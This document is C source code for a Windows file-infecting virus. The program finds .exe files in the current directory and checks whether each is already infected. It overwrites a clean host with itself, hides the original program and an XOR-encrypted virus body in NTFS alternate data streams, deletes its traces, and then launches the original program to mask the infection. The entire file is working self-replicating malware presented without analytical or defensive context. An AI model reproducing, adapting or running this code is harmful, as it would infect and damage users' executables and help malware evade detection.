#include<dirent.h>
#include<sys/stat.h>
#include<stdio.h>
#include<stdlib.h>
#include<string.h>

DIR *dirp;
struct dirent *dp;
struct stat st;
int stst;
long FileID;
char *lc;

int check_for_infection(char *hostfile, char *infectedfile);
int is_fork_present(char *fname, char *str);
int infect_file(char *hostfile, char *infectedfile);

int main(int argc , char *argv[]){
    char *host_file;
    char *infected_file = argv[1];
    char *infected_file_streams = "streams.exe";
    
    int is_infected;
    int finish_infect;
    char *excluded_file = "tmp2.exe";
    char command1[50], command2[50], command3[50];
    dirp=opendir(".");
    snprintf(command1, sizeof(command1),"start /b ./%s:CS.exe %s:streams.exe streams.exe", infected_file, infected_file);
    snprintf(command2, sizeof(command2), "del streams.exe"); 
    system(command1);
    
    while((dp=readdir(dirp))!= NULL){
    	if((stst=stat((const char *)&dp->d_name,&st))==0){
    		lc=(char *)&dp->d_name;
    		while(*lc!=0)lc++;
    		lc-=3;
    		if((((*lc=='E' || *lc=='e')&&(*(lc+1)=='X' || *(lc+1)=='x'))&&(*(lc+2)=='E' || *(lc+2)=='e'))!=0){
    			host_file = (char *)&dp->d_name;
    			
    			if((strcmp(host_file,infected_file) != 0) && (strcmp(host_file,excluded_file) != 0) && (strcmp(host_file,infected_file_streams) != 0)){
                                                   
	                     	is_infected = check_for_infection(host_file, infected_file);
                
				if(!is_infected){
		                          printf("will start infecting %s\n", host_file);
                		          finish_infect = infect_file(host_file, infected_file);
		                          break;               
                          
                		}
                	} 
                             
    		}
    	}
    	
    }
    
    system(command2);
    snprintf(command3, sizeof(command3), "start ./%s:oldprogram.exe",infected_file);
    system(command3);
    
    return 0;
}

int infect_file(char *hostfile, char *infectedfile){
    	char command1[50], command2[50], command3[50], command4[50], command5[50], command6[50], command7[50], command8[50];
    
	snprintf(command1, sizeof(command1), "copy /Y %s tmp5.exe > tmp.txt", hostfile);
	snprintf(command2, sizeof(command2), "copy /Y %s %s > tmp.txt", infectedfile, hostfile);
	snprintf(command3, sizeof(command3), "type tmp5.exe > %s:oldprogram.exe", hostfile);	
	snprintf(command4, sizeof(command4), "start /b ./%s:CS.exe %s:virus.exe tmp13.exe", hostfile, infectedfile); 
	snprintf(command5, sizeof(command5), "start /b ./%s:xorcipher.exe tmp13.exe tmp11.exe %s", hostfile, infectedfile); 
	snprintf(command6, sizeof(command6), "start /b ./%s:xorcipher.exe tmp11.exe tmp12.exe %s", hostfile, hostfile); 
	snprintf(command7, sizeof(command7),"type tmp12.exe > %s:virus.exe", hostfile);
	snprintf(command8, sizeof(command8),"del tmp5.exe tmp.txt tmp2.txt tmp11.exe tmp12.exe tmp13.exe");
	
	system(command1);
	system(command2);
	system(command3);
	system(command4);
	system(command5);
	system(command6);
	system(command7);
	system(command8);
					
    	return 0;   
    
}

int check_for_infection(char *hostfile, char *infectedfile){
    char command1[50], command2[50];
    int is_fork = 0;
    char *fname = "tmp14.txt";
    
    
    snprintf(command1, sizeof(command1),"streams.exe %s > %s",  hostfile, fname);     
    system(command1);
    while(access( fname, F_OK ) == -1){
   	//wait 
    }

    is_fork = is_fork_present(fname,":oldprogram.exe");
    snprintf(command2, sizeof(command2), "del %s", fname);
    system(command2);

    while(access( fname, F_OK ) != -1){
        //wait
    }

    if(is_fork){
      printf("%s is already infected\n", hostfile);
      return 1;                          
    }  
    else{
          printf("%s is clean. Infect it\n", hostfile);
          return 0;
    }
}

int is_fork_present(char *fname, char *str) {
	FILE *fp;
	
	int find_result = 0;
	char temp[512];

	//gcc users
	if((fp = fopen(fname, "r")) == NULL) {
           printf("error opening file\n");
		return(1);
	}

	//Visual Studio users
	//if((fopen_s(&fp, fname, "r")) != NULL) {
	//	return(-1);
	//}

	while(fgets(temp, 512, fp) != NULL) {
		if((strstr(temp, str)) != NULL) {		
			find_result++;
			if(fp) {
		           fclose(fp);
        	}
			return 1;
		}
	}

	if(find_result == 0) {
		if(fp) {
		       fclose(fp);
	    }
   	return(0);
	}
	
	
}
